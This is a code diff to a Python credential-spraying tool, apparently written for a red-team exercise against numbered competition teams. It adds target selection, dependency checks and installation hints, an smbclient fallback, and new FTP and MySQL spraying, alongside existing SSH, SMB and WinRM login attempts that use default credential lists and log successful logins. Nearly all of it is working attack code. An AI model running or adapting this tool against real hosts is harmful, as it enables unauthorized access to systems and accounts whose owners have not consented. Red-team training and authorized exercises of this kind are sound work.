@@ -30,7 +30,7 @@ ROOT_DIR = Path(__file__).resolve().parents[1]
 if str(ROOT_DIR) not in sys.path:
     sys.path.insert(0, str(ROOT_DIR))
 
-from lib.common import find_missing_binaries, get_log_dir, resolve_team_numbers
+from lib.common import attempt_install, find_missing_binaries, get_install_hints, get_log_dir, resolve_team_numbers
 
 
 # Configuration
@@ -63,6 +63,22 @@ TARGETS = [
     Target("storage", 14, "linux", ["ssh", "http", "mysql"]),
     Target("cake", 143, "linux", ["ssh", "http"]),
 ]
+
+
+def parse_targets(choice: str) -> List[Target]:
+    choice = choice.strip().lower()
+    if choice in ("all", ""):
+        return list(TARGETS)
+    if choice == "linux":
+        return [t for t in TARGETS if t.os_type == "linux"]
+    if choice == "windows":
+        return [t for t in TARGETS if t.os_type == "windows"]
+    requested = [token.strip().lower() for token in choice.split(",") if token.strip()]
+    known = {t.hostname.lower(): t for t in TARGETS}
+    unknown = sorted(set(requested) - set(known.keys()))
+    if unknown:
+        raise ValueError(f"Unknown targets: {', '.join(unknown)}")
+    return [known[name] for name in requested]
 
 # Default credentials to try
 DEFAULT_CREDS = [
@@ -153,6 +169,8 @@ class SSHSpray:
             return False, "Port 22 closed"
         if shutil.which("sshpass") is None:
             return False, "sshpass not installed"
+        if shutil.which("ssh") is None:
+            return False, "ssh not installed"
         
         cmd = [
             "sshpass", "-p", creds.password,
@@ -196,6 +214,13 @@ class SMBSpray:
         """Attempt SMB login using CrackMapExec"""
         if not check_port(ip, 445):
             return False, "Port 445 closed"
+        missing = []
+        if shutil.which("crackmapexec") is None:
+            missing.append("crackmapexec")
+        if shutil.which("timeout") is None:
+            missing.append("timeout")
+        if missing:
+            return False, f"Missing binaries: {', '.join(missing)}"
         
         cmd = [
             "timeout", str(timeout),
@@ -226,6 +251,13 @@ class SMBSpray:
         """Fallback using smbclient"""
         if not check_port(ip, 445):
             return False, "Port 445 closed"
+        missing = []
+        if shutil.which("smbclient") is None:
+            missing.append("smbclient")
+        if shutil.which("timeout") is None:
+            missing.append("timeout")
+        if missing:
+            return False, f"Missing binaries: {', '.join(missing)}"
         
         cmd = [
             "timeout", str(timeout),
@@ -255,6 +287,13 @@ class WinRMSpray:
         """Attempt WinRM login using CrackMapExec"""
         if not check_port(ip, 5985):
             return False, "Port 5985 closed"
+        missing = []
+        if shutil.which("crackmapexec") is None:
+            missing.append("crackmapexec")
+        if shutil.which("timeout") is None:
+            missing.append("timeout")
+        if missing:
+            return False, f"Missing binaries: {', '.join(missing)}"
         
         cmd = [
             "timeout", str(timeout),
@@ -315,6 +354,13 @@ class MySQLSpray:
         """Attempt MySQL login"""
         if not check_port(ip, 3306):
             return False, "Port 3306 closed"
+        missing = []
+        if shutil.which("mysql") is None:
+            missing.append("mysql")
+        if shutil.which("timeout") is None:
+            missing.append("timeout")
+        if missing:
+            return False, f"Missing binaries: {', '.join(missing)}"
         
         cmd = [
             "timeout", str(timeout),
@@ -340,8 +386,15 @@ class MySQLSpray:
 class SprayEngine:
     """Main credential spray orchestrator"""
     
-    def __init__(self, teams: List[int], parallel: bool = True, max_workers: int = 50):
+    def __init__(
+        self,
+        teams: List[int],
+        targets: List[Target],
+        parallel: bool = True,
+        max_workers: int = 50,
+    ):
         self.teams = teams
+        self.targets = targets
         self.parallel = parallel
         self.max_workers = max_workers
         self.results: Dict[str, List[Dict]] = {
@@ -381,6 +434,12 @@ class SprayEngine:
         # SMB
         if target.os_type == "windows":
             success, msg = SMBSpray.spray_cme(wan_ip, creds)
+            if not success and "Missing binaries" in msg:
+                logger.warning(f"[Team {team_num}] SMB skipped on {target.hostname}: {msg}")
+            if not success and "Missing binaries" not in msg:
+                fallback_success, fallback_msg = SMBSpray.spray_smbclient(wan_ip, creds)
+                if fallback_success:
+                    success, msg = fallback_success, fallback_msg
             if success:
                 result = {
                     "team": team_num,
@@ -398,6 +457,8 @@ class SprayEngine:
         # WinRM
         if target.os_type == "windows":
             success, msg = WinRMSpray.spray(wan_ip, creds)
+            if not success and "Missing binaries" in msg:
+                logger.warning(f"[Team {team_num}] WinRM skipped on {target.hostname}: {msg}")
             if success:
                 result = {
                     "team": team_num,
@@ -412,6 +473,42 @@ class SprayEngine:
                     self.results["winrm"].append(result)
                 logger.info(f"[Team {team_num}] WinRM SUCCESS on {target.hostname}: {creds.username}")
         
+        # FTP
+        if target.os_type == "linux" and "ftp" in target.services:
+            success, msg = FTPSpray.spray(wan_ip, creds)
+            if success:
+                result = {
+                    "team": team_num,
+                    "target": target.hostname,
+                    "ip": wan_ip,
+                    "service": "ftp",
+                    "creds": f"{creds.username}:{creds.password}",
+                    "message": msg,
+                }
+                results.append(result)
+                with self.lock:
+                    self.results["ftp"].append(result)
+                logger.info(f"[Team {team_num}] FTP SUCCESS on {target.hostname}: {creds.username}")
+
+        # MySQL
+        if target.os_type == "linux" and "mysql" in target.services:
+            success, msg = MySQLSpray.spray(wan_ip, creds)
+            if not success and "Missing binaries" in msg:
+                logger.warning(f"[Team {team_num}] MySQL skipped on {target.hostname}: {msg}")
+            if success:
+                result = {
+                    "team": team_num,
+                    "target": target.hostname,
+                    "ip": wan_ip,
+                    "service": "mysql",
+                    "creds": f"{creds.username}:{creds.password}",
+                    "message": msg,
+                }
+                results.append(result)
+                with self.lock:
+                    self.results["mysql"].append(result)
+                logger.info(f"[Team {team_num}] MySQL SUCCESS on {target.hostname}: {creds.username}")
+
         return results
     
     def run_spray(self, creds_list: List[Credentials] = None) -> Dict:
@@ -422,7 +519,7 @@ class SprayEngine:
         logger.info("=" * 70)
         logger.info("APERTURE SCIENCE CREDENTIAL ENRICHMENT TEST INITIATED")
         logger.info(f"Teams: {self.teams}")
-        logger.info(f"Targets: {len(TARGETS)}")
+        logger.info(f"Targets: {len(self.targets)}")
         logger.info(f"Credential sets: {len(creds_list)}")
         logger.info(f"Parallel mode: {self.parallel} (workers={self.max_workers})")
         logger.info("=" * 70)
@@ -430,7 +527,7 @@ class SprayEngine:
         tasks = []
         for team_num in self.teams:
             logger.info(f"Queued targets for Team {team_num}.")
-            for target in TARGETS:
+            for target in self.targets:
                 for creds in creds_list:
                     tasks.append((team_num, target, creds))
         logger.info(f"Prepared {len(tasks)} total spray tasks.")
@@ -523,6 +620,10 @@ Examples:
                         help="Only scan for services, don't spray")
     parser.add_argument("--extra-creds", type=str,
                         help="Additional creds file (user:pass per line)")
+    parser.add_argument("--targets", default="all",
+                        help="all, linux, windows, or comma-separated hostnames")
+    parser.add_argument("--install-deps", action="store_true",
+                        help="Attempt to install missing local dependencies")
     
     args = parser.parse_args()
     
@@ -546,17 +647,35 @@ Examples:
     else:
         teams = resolve_team_numbers(args.teams)
 
-    missing = find_missing_binaries(["sshpass", "crackmapexec", "smbclient", "mysql", "timeout"])
+    dependencies = ["ssh", "sshpass", "crackmapexec", "smbclient", "mysql", "timeout"]
+    if args.install_deps:
+        still_missing = attempt_install(dependencies)
+        if still_missing:
+            hints = get_install_hints(still_missing)
+            if hints:
+                print(f"[!] Still missing binaries after install attempt: {', '.join(still_missing)}")
+                for manager, hint in hints.items():
+                    print(f"[!] ({manager}) {hint}")
+    missing = find_missing_binaries(dependencies)
     if missing:
         print(f"[!] Missing local binaries: {', '.join(missing)}")
         print("[!] Install these tools to enable all spray modules.")
+        hints = get_install_hints(missing)
+        for manager, hint in hints.items():
+            print(f"[!] ({manager}) {hint}")
+
+    try:
+        targets = parse_targets(args.targets)
+    except ValueError as exc:
+        print(f"[!] {exc}")
+        return
     
     # Scan only mode
     if args.scan_only:
         print("\n[*] Scanning services for all targets...")
         for team_num in teams:
             print(f"\n=== Team {team_num} ===")
-            for target in TARGETS:
+            for target in targets:
                 wan_ip = target.get_wan_ip(team_num)
                 logger.info(f"Scanning {target.hostname} ({wan_ip}) for open services.")
                 services = scan_services(wan_ip)
@@ -577,8 +696,9 @@ Examples:
     # Run spray
     engine = SprayEngine(
         teams=teams,
+        targets=targets,
         parallel=not args.sequential,
-        max_workers=args.workers
+        max_workers=args.workers,
     )
     
     results = engine.run_spray(creds_list)
